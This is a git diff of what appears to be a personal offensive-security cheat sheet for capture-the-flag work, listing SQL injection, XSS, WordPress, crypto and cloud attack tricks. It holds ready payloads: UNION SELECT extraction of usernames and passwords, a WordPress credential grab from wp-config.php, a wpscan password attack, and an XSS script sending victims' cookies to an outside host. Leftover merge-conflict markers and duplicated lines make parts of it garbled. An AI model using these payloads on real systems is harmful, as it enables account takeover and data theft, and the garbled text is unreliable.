@@ -19,9 +19,9 @@ Sqlite (Into Outfile equivalent)----"""ATTACH DATABASE '/home/devnull/public_htm
 Multiple Columns in a Single Column----' UNION SELECT username || '~' || password FROM users--
 
 ##Odds & Ends
-FireFox Browse Nonstandard Ports----about:config --> network.security.ports.banned.override (String <port-num>)
+FireFox Browse Nonstandard Ports----about:config -- network.security.ports.banned.override (String &lt;port-num&gt;)
 
-Webdav----sudo mount -t davfs http://<target-server>:<port> /mnt/webdav
+Webdav----sudo mount -t davfs http://&lt;target-server&gt;:&lt;port&gt; /mnt/webdav
 
 ##Wordpress
 Post-Exploitation----Database credentials located in wp-config.php (cat wp-config.php | grep DB_)
@@ -29,15 +29,17 @@ Wordpress Scan----wpscan --url &lt;domain&gt;  -e ap,at,u,cb,dbe --password-atta
 xmlrpc -P /usr/share/wordlists/fasttrack.txt -o wpscan.txt
 
 ##XSS
-<<<<<<< HEAD
-SVG - No spaces----<svg/OnLoad="`${prompt``}`">
-Cookie Stealing----<script>document.write('<img src="https://www.hooperlabs.xyz/cookie?' + document.cookie + '">')</script>
+SVG - No spaces----&lt;svg/OnLoad="`${prompt``}`"&gt;
+Cookie Stealing----&lt;script&gt;document.write('&lt;img src="https://www.hooperlabs.xyz/cookie?' + document.cookie + '"&gt;')&lt;/script&gt;
 XSS Web Request----
 http://challenge.acictf.com:61470/search?search=foo&foobarh00p%3Csvg//onload%3d%22alert(1)%22%3E=%3Cscript%3E
 =======
 SVG - No spaces----&lt;svg/OnLoad="`${prompt``}`"&gt;
 Cookie Stealing----&lt;script&gt;document.write('&lt;img src="https://www.hooperlabs.xyz/cookie?' + document.cookie + '"&gt;')&lt;/script&gt;
->>>>>>> 3ef53f506b36620de2786d307a02a5a162602f2f
+
+##Crypto
+ECB (ref)----<
+Attacking ECB----##1. Determine the key block size.  Increment the PT by one until the CT changes by X bytes.  Usually 8 bytes or 16 bytes.;  2. If possible, find an oracle.  That is, something that allows either PT --> CT or CT --> PT to arbitrary inputs;  
 
 ##Cloud
 Domain Hijacking----Have 404s pointing to a S3 bucket?  Take over the subdomain!
